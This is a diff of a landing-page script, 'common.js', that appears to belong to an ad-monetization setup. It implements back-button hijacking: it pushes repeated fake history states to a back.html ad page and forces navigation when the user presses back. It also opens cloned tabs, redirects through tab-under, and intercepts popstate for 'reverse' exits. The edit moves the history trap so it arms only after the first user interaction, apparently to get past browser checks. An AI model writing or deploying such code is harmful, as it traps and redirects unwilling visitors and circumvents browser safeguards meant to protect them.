@@ -1,4 +1,4 @@
-/* common.js — FULL MONOLITHIC VERSION (Back-Fix + Clone + Multi-Exit) [BACK FIXED] */
+/* common.js — FULL MONOLITHIC VERSION (Back on first interaction + Clone + Multi-Exit) */
 
 (() => {
   "use strict";
@@ -115,13 +115,9 @@
   };
 
   // ---------------------------
-  // BACK (FIXED)
+  // BACK (on first interaction)
   // ---------------------------
-
-  // One-shot guard: avoid inflating history by multiple initBack calls
   let __backInited = false;
-
-  // Prevent re-entrant firing when forcing load
   let __backFiring = false;
 
   const pushBackStates = (url, count) => {
@@ -136,7 +132,6 @@
     } catch {}
   };
 
-  // Same idea as your v10: compute default back.html in the same directory
   const getDefaultBackHtmlUrl = () => {
     const { origin, pathname } = window.location;
     let dir = pathname.replace(/\/(index|back)\.html$/i, "");
@@ -154,8 +149,6 @@
 
     const count = cfg.back?.count ?? 10;
     const pageUrl = cfg.back?.pageUrl || getDefaultBackHtmlUrl();
-
-    // Build back page absolute URL relative to current page (safe for absolute/relative)
     const page = new URL(pageUrl, window.location.href);
 
     const qs = buildExitQSFast({ zoneId: b.zoneId });
@@ -169,14 +162,23 @@
     pushBackStates(page.toString(), count);
   };
 
-  // Critical piece: pushState does NOT load back.html; force-load it on popstate back step
+  // pushState does NOT load back.html; force-load it on back step
   window.addEventListener("popstate", (e) => {
     if (e?.state && e.state.__isBack && !__backFiring) {
       __backFiring = true;
-      // At this moment address bar already contains back.html?... -> force actual navigation
       replaceTo(window.location.href);
     }
   });
+
+  // Arm back only after real interaction (no init on load)
+  const armBackOnFirstInteraction = (cfg) => {
+    const arm = () => initBackFast(cfg);
+
+    // "interaction" = click/tap/keyboard. (No scroll here)
+    ["pointerdown", "touchstart", "keydown"].forEach(ev => {
+      window.addEventListener(ev, arm, { once: true, passive: true });
+    });
+  };
 
   // ---------------------------
   // Exits
@@ -220,8 +222,7 @@
     if (!cfg?.reverse?.currentTab) return;
     safe(() => window.history.pushState({ __rev: 1 }, "", window.location.href));
     window.addEventListener("popstate", (e) => {
-      // Do not hijack back stack steps
-      if (e?.state && e.state.__isBack) return;
+      if (e?.state && e.state.__isBack) return; // don't hijack back steps
       runExitCurrentTabFast(cfg, "reverse", false);
     });
   };
@@ -249,8 +250,10 @@
   const runMicroHandoff = (cfg) => {
     if (isClone) { run(cfg, "mainExit"); return; }
     openTab(buildCloneUrl());
+
     const ex = cfg?.tabUnderClick?.newTab || cfg?.tabUnderClick?.currentTab;
     const monetUrl = resolveUrlFast(ex, cfg);
+
     if (monetUrl) {
       initBackFast(cfg);
       setTimeout(() => replaceTo(monetUrl), 40);
@@ -267,10 +270,10 @@
     const microTargets = new Set(["chest_play", "chest_lost", "banner_close", "modal_stay"]);
 
     document.addEventListener("click", (e) => {
-      const t = e.target?.closest?.("[data-target]")?.getAttribute("data-target") || "";
+      // Any click is an interaction -> arm back (one-shot)
+      initBackFast(cfg);
 
-      // If this is clone, ensure back is armed (one-shot)
-      if (isClone) initBackFast(cfg);
+      const t = e.target?.closest?.("[data-target]")?.getAttribute("data-target") || "";
 
       if (isClone) {
         if (fired) return; fired = true;
@@ -299,9 +302,8 @@
 
     window.LANDING_EXITS = { cfg, run: (name) => run(cfg, name) };
 
-    // Optional: warm-up only once; safe due to one-shot guard
-    const warmUp = () => { initBackFast(cfg); };
-    ["touchstart", "mousedown", "scroll"].forEach(ev => window.addEventListener(ev, warmUp, { once: true }));
+    // Back is armed only after user interaction (no history push on load)
+    armBackOnFirstInteraction(cfg);
 
     initClickMap(cfg);
     initAutoexit(cfg);
